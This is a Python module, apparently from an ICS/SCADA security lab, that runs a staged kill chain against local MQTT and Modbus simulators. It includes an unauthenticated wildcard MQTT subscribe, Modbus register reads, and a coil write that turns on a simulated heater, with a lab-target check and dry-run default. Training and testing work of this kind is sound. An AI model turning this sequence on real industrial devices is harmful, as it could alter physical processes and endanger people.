"""Attack orchestrator — full ICS/SCADA kill-chain simulation on localhost sims."""

from __future__ import annotations

import json
import time
from typing import Any

from .common import LAB_HOST, assert_lab_target, hexdump, utcnow_iso
from .report import ReportBuilder

# ---- Phase names ----
PHASE_RECON = "recon"
PHASE_ENUMERATE = "enumerate"
PHASE_EXPLOIT_SUBSCRIBE = "exploit_mqtt_subscribe"
PHASE_EXPLOIT_REGISTER = "exploit_modbus_read"
PHASE_EXPLOIT_WRITE = "exploit_modbus_write"
PHASE_CONFIRM = "physical_state_confirm"
PHASE_REPORT = "report"


def run_kill_chain(
    mqtt_port: int = 11883,
    modbus_port: int = 15050,
    host: str = LAB_HOST,
    dry_run: bool = True,
) -> dict[str, Any]:
    """
    Full ICS/SCADA kill-chain simulation on localhost sims.

    Phases:
    1. Recon — discover MQTT topics (unauthenticated subscribe)
    2. Enumerate — read Modbus holding registers (no auth)
    3. Exploit — write coil to change physical state
    4. Confirm — verify physical state changed
    5. Report — generate JSON + Markdown report
    """
    assert_lab_target(host)
    report = ReportBuilder("ICS/SCADA Kill-Chain Simulation", reports_dir="reports")
    results: dict[str, Any] = {
        "dry_run": dry_run,
        "phases": [],
        "success": False,
    }

    # ---- Phase 1: Recon — MQTT unauthenticated subscribe ----
    report.add_phase(PHASE_RECON, "running", "Discovering MQTT topics via unauthenticated subscribe")
    mqtt_topics_found = []
    try:
        from .mqtt_module import MQTTBrokerSim, build_connect, build_subscribe, build_disconnect, parse_packet, recv_packet
        import socket as _sock
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, mqtt_port))
        s.sendall(build_connect("attack-recon"))
        resp = recv_packet(s)
        connack = parse_packet(resp)
        # Subscribe to wildcard
        s.sendall(build_subscribe(1, "#"))
        resp = recv_packet(s)
        suback = parse_packet(resp)
        # Collect messages
        while True:
            try:
                data = recv_packet(s, timeout=1)
            except _sock.timeout:
                break
            if data is None:
                break
            try:
                msg = parse_packet(data)
            except ValueError:
                break
            mqtt_topics_found.append(msg)
        s.sendall(build_disconnect())
        s.close()

        topic_names = [m.get("topic", "unknown") for m in mqtt_topics_found]
        report.add_phase(PHASE_RECON, "completed",
                        f"Found {len(topic_names)} topics via unauthenticated subscribe: {topic_names}")
        report.add_finding("CRITICAL", "MQTT Authentication Bypass",
                          f"Unauthenticated subscribe leaked {len(topic_names)} topics: {topic_names}")
        results["mqtt_topics"] = topic_names
    except Exception as e:
        report.add_phase(PHASE_RECON, "failed", str(e))
        results["mqtt_error"] = str(e)

    # ---- Phase 2: Enumerate — Modbus register read ----
    report.add_phase(PHASE_ENUMERATE, "running", "Reading Modbus holding registers (no auth)")
    modbus_readings = {}
    try:
        from .modbus_module import modbus_read, FC_READ_HOLDING
        regs = modbus_read(host, modbus_port, FC_READ_HOLDING, 0, 4)
        data_bytes = regs.get("data", b"")
        if len(data_bytes) >= 8:
            modbus_readings = {
                "temperature_setpoint": int.from_bytes(data_bytes[0:2], "big"),
                "humidity": int.from_bytes(data_bytes[2:4], "big"),
                "firmware_version": f"0x{int.from_bytes(data_bytes[4:6], 'big'):04X}",
                "error_count": int.from_bytes(data_bytes[6:8], "big"),
            }
        report.add_phase(PHASE_ENUMERATE, "completed",
                        f"Read holding registers: {modbus_readings}")
        report.add_finding("HIGH", "Modbus No-Auth Read",
                          f"Successfully read registers without authentication: {modbus_readings}")
        results["modbus_readings"] = modbus_readings
    except Exception as e:
        report.add_phase(PHASE_ENUMERATE, "failed", str(e))
        results["modbus_read_error"] = str(e)

    # ---- Phase 3: Exploit — Write coil to change physical state ----
    if not dry_run:
        report.add_phase(PHASE_EXPLOIT_WRITE, "running", "Writing coil 0 (heater) to ON")
        try:
            from .modbus_module import modbus_write_coil, modbus_read, FC_READ_COILS
            write_result = modbus_write_coil(host, modbus_port, 0, True)
            report.add_phase(PHASE_EXPLOIT_WRITE, "completed",
                            f"Write coil 0 = True (heater ON), response: {write_result}")
            report.add_finding("CRITICAL", "Modbus No-Auth Write",
                              "Successfully wrote coil 0 to ON without authentication — heater state changed")
            results["modbus_write"] = write_result
        except Exception as e:
            report.add_phase(PHASE_EXPLOIT_WRITE, "failed", str(e))
            results["modbus_write_error"] = str(e)
    else:
        report.add_phase(PHASE_EXPLOIT_WRITE, "skipped", "Dry-run mode — destructive write skipped")
        results["modbus_write"] = "skipped_dry_run"

    # ---- Phase 4: Confirm physical state ----
    report.add_phase(PHASE_CONFIRM, "running", "Confirming physical state via register read")
    try:
        from .modbus_module import modbus_read, FC_READ_COILS, FC_READ_HOLDING
        coils = modbus_read(host, modbus_port, FC_READ_COILS, 0, 8)
        coil_data = coils.get("data", b"")
        heater_on = bool(coil_data[0] & 0x01) if coil_data else False
        report.add_phase(PHASE_CONFIRM, "completed",
                        f"Coil 0 state: {'ON' if heater_on else 'OFF'}")
        results["heater_state"] = "ON" if heater_on else "OFF"
    except Exception as e:
        report.add_phase(PHASE_CONFIRM, "failed", str(e))

    # ---- Phase 5: Report ----
    jp, mp = report.save("kill_chain")
    report.add_phase(PHASE_REPORT, "completed", f"Report saved: {jp}, {mp}")
    results["report_json"] = str(jp)
    results["report_md"] = str(mp)
    results["success"] = all(
        p.get("status") in ("completed", "skipped")
        for p in report.phases
    )
    results["phases"] = report.phases
    results["findings"] = report.findings

    return results


# ============================================================================
# Demo mode
# ============================================================================

def run_demo() -> dict[str, Any]:
    """Run full demo of the kill chain on localhost sims."""
    from .mqtt_module import MQTTBrokerSim
    from .modbus_module import ModbusSlaveSim

    # Start sims
    mqtt_broker = MQTTBrokerSim()
    mqtt_broker.start()
    modbus_slave = ModbusSlaveSim()
    modbus_slave.start()
    time.sleep(0.5)

    try:
        results = run_kill_chain(
            mqtt_port=mqtt_broker.port,
            modbus_port=modbus_slave.port,
            host=LAB_HOST,
            dry_run=True,
        )
    finally:
        mqtt_broker.stop()
        modbus_slave.stop()

    return results
